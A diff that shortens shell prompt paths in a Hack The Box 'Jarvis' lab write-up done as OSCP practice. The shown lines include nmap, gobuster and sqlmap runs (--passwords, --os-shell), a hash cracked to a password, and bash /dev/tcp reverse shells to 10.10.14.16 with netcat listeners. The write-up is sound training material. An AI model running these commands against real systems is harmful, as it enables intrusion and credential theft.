@@ -46,7 +46,7 @@ This machine was done as OSCP preparation so without SQLMap.
 ## Open ports
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jerry$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.143
+luc@kali:~/HTB/Jerry$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.143
 ```
 
 ![NMAP results](/assets/images/HTB-Jarvis/1.a%20NMAP%20results.png)
@@ -133,15 +133,15 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 ### Cracking the password hash
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ hashcat --example-hashes
+luc@kali:~/HTB/Jarvis$ hashcat --example-hashes
 ...
 MODE: 300
 TYPE: MySQL4.1/MySQL5
 HASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130
 PASS: hashcat
 ...
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ echo 'DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hashes
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ hashcat -m 300 --username hashes /usr/share/seclists/Passwords/darkweb2017-top10000.txt
+luc@kali:~/HTB/Jarvis$ echo 'DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hashes
+luc@kali:~/HTB/Jarvis$ hashcat -m 300 --username hashes /usr/share/seclists/Passwords/darkweb2017-top10000.txt
 ...
 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
 ...
@@ -154,7 +154,7 @@ We've found the password `imissyou`
 We've a password, but nowhere to use it (DBadmin:imissyou didn't work as SSH credentials). Running GOBuster does show an interesting result.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ gobuster dir -u http://10.10.10.143:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
+luc@kali:~/HTB/Jarvis$ gobuster dir -u http://10.10.10.143:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
 ...
 /phpmyadmin (Status: 301) [Size: 317]
 ...
@@ -177,7 +177,7 @@ GET /cmd.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.16/443+0>%261" HTTP/1.1
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 443
+luc@kali:~/HTB/Jarvis$ sudo nc -lnvp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
@@ -193,8 +193,8 @@ www-data@jarvis:/var/www/html$
 ### Linpeas
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ python3 -m http.server
+luc@kali:~/HTB/Jarvis$ cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
+luc@kali:~/HTB/Jarvis$ python3 -m http.server
 ```
 
 ```bash
@@ -268,7 +268,7 @@ pepper@jarvis:/var/www/Admin-Utilities$ bash -i >& /dev/tcp/10.10.14.16/444 0>&1
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 444
+luc@kali:~/HTB/Jarvis$ sudo nc -lnvp 444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::444
 Ncat: Listening on 0.0.0.0:444
@@ -305,7 +305,7 @@ pepper@jarvis:~$ /bin/systemctl start exploit
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sudo nc -lnvp 445
+luc@kali:~/HTB/Jarvis$ sudo nc -lnvp 445
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::445
 Ncat: Listening on 0.0.0.0:445
@@ -337,7 +337,7 @@ SQLMap wasn't used during the initial exploitation of this box to keep it limite
 #### Confirming the vulnerable parameter
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+luc@kali:~/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 ...
 Parameter: cod (GET)
     Type: boolean-based blind
@@ -357,7 +357,7 @@ Parameter: cod (GET)
 #### DBadmin password
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords
+luc@kali:~/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --passwords
 ...
 [*] DBadmin [1]:
     password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
@@ -368,7 +368,7 @@ luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/ro
 #### Shell
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell
+luc@kali:~/HTB/Jarvis$ sqlmap -u http://10.10.10.143/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --os-shell
 ...
 os-shell> whoami
 do you want to retrieve the command standard output? [Y/n/a] Y
